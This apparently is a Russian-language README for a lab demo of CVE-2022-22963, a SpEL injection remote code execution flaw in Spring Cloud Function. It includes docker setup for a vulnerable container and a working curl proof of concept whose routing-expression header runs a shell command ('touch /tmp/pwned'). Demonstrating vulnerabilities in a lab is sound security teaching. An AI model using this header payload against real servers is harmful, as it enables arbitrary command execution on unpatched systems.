# RCE в Spring Cloud Function (CVE-2022-22963)

Демо уязвимости [CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963).

Эта уязвимость в функции  роутинга Spring Cloud Function позволяет провести инъекцию кода через  Spring Expression Language (SpEL) путем добавления в HTTP-запрос  специального заголовка spring.cloud.function.routing-expression.  SpEL — это специальный язык выражений, созданный для Spring Framework,  который поддерживает запросы и управление графом объектов во время  выполнения.

## Уязвимая конфигурация:

+ Spring Cloud Function 3.1.6, 3.2.2 и более старые версии

# Демонстрация

https://user-images.githubusercontent.com/57348147/161266562-51d025f0-54d4-488f-ac50-2317e29bfbdf.mp4

## Поднятие стенда

### docker pull

```bash
docker pull me2nuk/cves:2022-22963
docker run -it -p 8080:8080 --name=vuln me2nuk/cves:2022-22963
```

### git clone

```bash
git clone git@github.com:gtfobar/cve-2022-22963-demo.git
cd cve-2022-22963-demo
docker build -t cve-2022-22963-demo
docker run -it -p 8080:8080 --name=vuln cve-2022-22963-demo
```

## POC

```bash
curl -X POST  http://0.0.0.0:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
docker exec -it --user=root vuln ls /tmp
```

#### Полезные ссылки:

+ [https://github.com/me2nuk/CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)
+ [https://tanzu.vmware.com/security/cve-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963)
+ [https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md](https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md)
+ [https://github.com/spring-cloud/spring-cloud-function](https://github.com/spring-cloud/spring-cloud-function)
+ [https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
